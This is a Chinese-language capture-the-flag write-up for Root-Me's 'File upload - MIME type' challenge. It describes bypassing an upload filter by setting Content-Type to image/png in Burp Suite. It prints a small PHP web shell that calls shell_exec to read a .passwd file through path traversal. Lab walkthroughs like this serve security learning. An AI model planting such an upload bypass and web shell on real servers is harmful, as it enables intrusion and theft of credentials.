## [[Root-Me](https://www.root-me.org/)] [[Web-Server](https://www.root-me.org/en/Challenges/Web-Server/)] [[File upload - MIME type](https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type)] [[解题报告](https://exp-blog.com/safe/ctf/rootme/web-server/file-upload-mime-type/)]

------

这题和【[Web-Server : File upload - double extensions](http://exp-blog.com/2019/01/13/pid-2985/)】的渗透思路是一样的，区别在于绕过方式。

上传一个文件测试一下，发现这次无法再利用双重后缀绕过了，只能上传图片后缀的文件。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B15%5D%20%5B20P%5D%20File%20upload%20-%20MIME%20type/imgs/01.png)

题目提示是使用 MIME type 实现绕过。

那么构造 payloads 文件内容都是一样的，不过因为不能利用后缀绕过，所以文件名保持为 `exp.php` 即可：

```php
<?php
	// exp.php
	// 假如这个文件上传成功，则可以利用 web 打开这个文件进行解析时进行路径穿越
	$content = shell_exec('cat ../../../.passwd');
	echo "<pre>$content</pre>";
?>
```

使用 Burp Suite -> Repeater 进行上传，同时要修改 `Content-Type` 的值为 `image/png` 即可实现绕过（原值为 `application/octet-stream`）。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B15%5D%20%5B20P%5D%20File%20upload%20-%20MIME%20type/imgs/02.png)

上传成功后刷新 upload 分类页面，找到 `exp.php` 打开即可获得密码，完成挑战。


![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B15%5D%20%5B20P%5D%20File%20upload%20-%20MIME%20type/imgs/03.png)

------

## 版权声明

　[![Copyright (C) EXP,2016](https://img.shields.io/badge/Copyright%20(C)-EXP%202016-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
